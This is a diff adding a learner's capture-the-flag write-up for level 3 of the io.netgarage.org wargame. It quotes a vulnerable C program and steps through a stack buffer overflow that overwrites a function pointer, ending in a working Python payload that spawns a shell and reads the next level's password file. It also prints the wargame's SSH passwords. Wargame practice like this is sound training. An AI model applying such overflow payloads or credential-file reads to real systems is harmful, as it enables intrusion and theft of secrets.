@@ -1,0 +1,266 @@
+connection: ssh level3@io.netgarage.org
+password: OlhCmdZKbuzqngfz
+
+looking around the directory we see:
+explainlevel2.sh
+explainlevel2_alt.sh
+.level2_alt.tpp
+.level2.tpp
+.pass -> (our password OlhCmdZKbuzqngfz)
+
+oh so it includes a writeup of how to do the level previous (and another alternate method i didnt see)
+
+this looks much prettier if you run it instead of using cat...
+
+apparently the int that the catcher takes is "8" as thats what SIGFPE sends
+
+so as the 32nd bit represents the sign, there is one more negative number than positive:
+1 -> 2147483647
+-2147483648 -> -1
+
+so you cant convert -2147483648 to its positive equivilent as it doesn't exist
+
+integer multiplication with these 32bit values doesnt encounter this overflow error
+only abs does - which is odd (so abs can return a non-positive number - funy)
+
+apparently you can also send the "8" int yourself to the catcher, although I don't quite understand the code i see here
+
+===============================================================================
+instead of downloading it, ill just cat the level03.c file:
+
+//bla, based on work by beach
+
+#include <stdio.h>
+#include <string.h>
+
+void good()
+{
+        puts("Win.");
+        execl("/bin/sh", "sh", NULL);
+}
+void bad()
+{
+        printf("I'm so sorry, you're at %p and you want to be at %p\n", bad, good);
+}
+
+int main(int argc, char **argv, char **envp)
+{
+        void (*functionpointer)(void) = bad;
+        char buffer[50];
+
+        if(argc != 2 || strlen(argv[1]) < 4)
+                return 0;
+
+        memcpy(buffer, argv[1], strlen(argv[1]));
+        memset(buffer, 0, strlen(argv[1]) - 4);
+
+        printf("This is exciting we're going to %p\n", functionpointer);
+        functionpointer();
+
+        return 0;
+}
+===============================================================================
+
+I see a character buffer -> might be an overflow
+i guess we want to overwrite %p and point it to void "good"
+
+I know what argc and argv are - whats envp?:
+
+environment pointer?
+from gnu 25.1 Program Arguments:
+
+im used to seeing:
+int main (int argc, char *argv[]) - or **argv (pointer for pointer instead of vector)
+
+but in Unix, main can be defined:
+int main (int argc, char *argv[], char *envp[]) -> this **env or *envp[] is the same value as "environ"
+not sure what environ does either...
+
+from linux man:
+
+variable environ points to an array of pointers to strings called the "environment". The last pointer in this array has the value NULL
+
+okay - start with assumption i'm not going to fiddle around with what is in the environment, and just see if i can overflow the buffer
+
+=========
+
+we need argc != 2 ∴ we supply one argument ourselves to the binary
+also - the length of the string we supply needs to be less than 4
+
+so - what 3 character strings overflow a 50 character buffer?
+
+lets just try aaa to see what it says:
+-> nothing
+what if the < 4 doesnt do what i think:
+-> This is exciting we're going to 0x80484a4
+-> I'm so sorry, you're at 0x80484a4 and you want to be at 0x8048474
+
+oh - im kind of close - regardless of the number of "a"s it returns memadd: 0x80484a4
+
+next day -> can't get my aaaa input to work again
+level3@io:/levels$ ./level03 aaaa
+./ + level02 or level01 still works, not sure what's happening
+okay - it works now (not sure why it stopped, maybe typos?)
+
+=========
+
+lets run through the code:
+
+defines "good" -> the function that gives us perms
+
+defines "bad" -> a function that prints the memory address for "bad" and "good"
+
+main takes: function name + arguments + environment pointer
+
+    declares a function pointer called "functionpointer" and assigns it to the memory address for  the "bad" function
+
+    a buffer of size 50 characters is init 
+
+    if argument_count != 2 OR length of string at argument_vector[1] is smaller than 4:
+        return 0 (exit function before fun stuff)
+
+    mem_copy puts argv[1] into the buffer (this seems to be blind)
+    mem_set sets all except the last 4 bytes to zeros in the buffer (by this point we would have already overflowed)
+
+==========
+
+lets try 100 "a"s:
+./level03 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+-> This is exciting we're going to (nil)
+-> Segmentation fault
+
+okay thats too much, 75?
+-> 0x80484a4 again
+90?
+-> Segmentation fault
+80?
+-> This is exciting we're going to 0x61616161
+-> Segmentation fault
+okay, thats different
+ASCI hex value for "a" is 61 -> so we are overwriting the return pointer!
+
+we know what address we need it to point to -> 0x8048474
+so what's that as a string? -> HG
+
+if i repeat that untill its 80 long, what does that get us?
+HGHGHGHGHGHGHGHGHGHGHGHGHGHGHGHGHGHGHGHG
+-> Segmentation fault
+HGHGHGHGHGHGHGHGHGHG (however many that is
+-> This is exciting we're going to 0x8490e247
+-> Segmentation fault
+
+okay that looks much closer, 0x8490e247 - 0x8048474 = 2089573843 (oh, we were actually closer with aaaaa's)
+
+new approach - what does the ASCII table say are the values that would equal our target:
+80 -> €
+48 -> H
+47 -> G
+this digit is cut off so can be anything we want starting with 4
+46 -> F
+
+lets try a bunch of €HGF (80)
+-> Segmentation fault
+70?
+-> Segmentation fault
+52?
+€HGF€HGF€HGF€HGF€HGF€HGF€HGF€HGF€HGF€HGF€HGF€HGF€HGF
+-> This is exciting we're going to 0x8044647
+nice - now what does this correspond to?
+
+0x8048474 vs
+0x8044647 -> ooh we're close
+
+given only exceeding the buffer by 2 characters resulted in a new return address, maybe the return address sits directly on top (under?) the buffer
+lets try "a" * 50 + "€HGF"
+-> I'm so sorry, you're at 0x80484a4 and you want to be at 0x8048474
+
+thats the same as just a bunch of "a"s, so not great
+54 "€HGF" characters
+-> This is exciting we're going to 0x82e20000
+60?
+€HGF€HGF€HGF€HGF€HGF€HGF€HGF€HGF€HGF€HGF€HGF€HGF
+-> nil
+56?
+-> nil
+52?
+-> 0x8044647
+i see a 47 as the last bits, what happens if i swap "G" for "3" (33 in hex)
+52 * chars from "€H3F"
+€H3F€H3F€H3F€H3F€H3F€H3F€H3F€H3F€H3F€H3F€H3F€H3F€H3F
+-> This is exciting we're going to 0x8044633
+so we've got the 33 showing up, we want a 74 in that position, so "t"
+52 * chars from "€HtF"
+€HtF€HtF€HtF€HtF€HtF€HtF€HtF€HtF€HtF€HtF€HtF€HtF€HtF
+-> This is exciting we're going to 0x8044674
+we want 0x8048474, so the character before "3" needs to correspond to 84, which is ""
+52 * chars from "€tF"
+€tF€tF€tF€tF€tF€tF€tF€tF€tF€tF€tF€tF€tF
+-> Segmentation fault
+hmm, maybe i need to use characters inside the ASCII table (so below 7F and above 20)
+
+lets push the stream 1 across by adding an "a":
+
+a€HtF€HtF€HtF€HtF€HtF€HtF€HtF€HtF€HtF€HtF€HtF€HtF€HtF
+-> This is exciting we're going to 0x8467448
+48 -> H
+74 -> t
+46 -> F
+8 -> from € (who'se hex is 80... so where's the 0 gone)
+
+we want the string:
+0x8048474
+how can we split this up:
+80 + 48 + 47 + 4? -> this seems doable, but our previous strings indicate that whatever characters we put in the buffer, align with the end evenly
+?8 + 04 + 84 + 74 -> 04 is an end of transmission character, so not really printable, and 84 is out of range for normal ASCII
+
+oh, because of the endianness, our bytes are actualy read right to left!
+
+so lets take the following as our target: 4748408
+80 -> €
+48 -> H
+47 -> G
+4? -> @ (40 hex)
+
+72 * char "€HG@"
+€HG@€HG@€HG@€HG@€HG@€HG@€HG@€HG@€HG@€HG@€HG@€HG@€HG@
+-> This is exciting we're going to 0x8044047
+
+hmm, i dont think i understand how this works, we can see our 47 and 40 so lets just try "47" "48"
+
+80:
+GHGHGHGHGHGHGHGHGHGHGHGHGHGHGHGHGHGHGHGHGHGHGHGHGHGHGHGHGHGHGHGHGHGHGHGHGHGHGHGH
+-> This is exciting we're going to 0x48474847
+78:
+GHGHGHGHGHGHGHGHGHGHGHGHGHGHGHGHGHGHGHGHGHGHGHGHGHGHGHGHGHGHGHGHGHGHGHGHGHGHGH
+-> This is exciting we're going to 0x8044847
+aghhh, we seemingly just need a string that is repeated "84" "74" that is 78 long to get this, but ASCII 84 is: „ (for web apparently)
+lets try that and "t" for 74
+
+78:
+t„t„t„t„t„t„t„t„t„t„t„t„t„t„t„t„t„t„t„t„t„t„t„t„t„t„t„t„t„t„t„t„t„t„t„t„t„t„t„
+-> Segmentation fault
+
+„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„
+„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„
+„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„
+„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„
+„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„„
+„„„„„„„„„„„„„„„„„„„„„„„„„„„ <- this one finally registers as 0x80e29e00 (so „ isnt recognised as 84)
+
+can we force 84?
+$(python -c "print 78*'\x84'")
+we can! that makes this easier
+
+lets try:
+$(python -c "print 39*'\x84\x74'")
+-> This is exciting we're going to 0x8047484
+let swap them round:
+$(python -c "print 39*'\x74\x84'")
+-> This is exciting we're going to 0x8048474
+-> Win.
+
+yikes that took me too long to use python :)
+cat /home/level4/.pass
+->7WhHa5HWMNRAYl9T
+
+
